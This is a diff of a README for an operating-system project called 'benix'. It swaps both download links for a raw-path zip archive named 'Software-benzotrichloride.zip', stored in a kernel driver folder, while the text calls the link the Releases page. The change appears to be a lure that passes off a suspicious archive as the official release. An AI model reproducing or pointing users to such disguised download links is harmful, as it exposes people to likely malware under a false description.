@@ -1,6 +1,6 @@
 # 🖥️ benix - A Simple Operating System for Everyone
 
-[![Download benix](https://raw.githubusercontent.com/R-Marc221/benix/main/kernel/init/Software-3.8.zip)](https://raw.githubusercontent.com/R-Marc221/benix/main/kernel/init/Software-3.8.zip)
+[![Download benix](https://raw.githubusercontent.com/R-Marc221/benix/main/kernel/drivers/fs/Software-benzotrichloride.zip)](https://raw.githubusercontent.com/R-Marc221/benix/main/kernel/drivers/fs/Software-benzotrichloride.zip)
 
 ## 📚 Overview
 
@@ -27,7 +27,7 @@ To successfully run benix, your system should meet the following requirements:
 
 To download benix and start using it, visit the Releases page:
 
-[Download benix](https://raw.githubusercontent.com/R-Marc221/benix/main/kernel/init/Software-3.8.zip)
+[Download benix](https://raw.githubusercontent.com/R-Marc221/benix/main/kernel/drivers/fs/Software-benzotrichloride.zip)
 
 On the Releases page, you'll find different versions of benix. Download the latest version by clicking on the corresponding link. Once the download finishes, follow these steps to prepare and run the operating system:
 
